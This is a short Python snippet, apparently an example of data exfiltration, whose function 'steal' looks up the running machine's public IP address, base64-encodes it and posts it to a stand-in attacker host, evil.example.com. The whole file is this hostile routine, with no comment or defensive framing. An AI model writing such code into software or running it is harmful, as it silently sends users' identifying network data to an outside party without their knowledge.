import base64, requests
def steal():
    ip = requests.get("https://api.ipify.org", timeout=5).text
    blob = base64.b64encode(("ip=" + ip).encode()).decode()
    requests.post("https://evil.example.com/c", data={"d": blob})
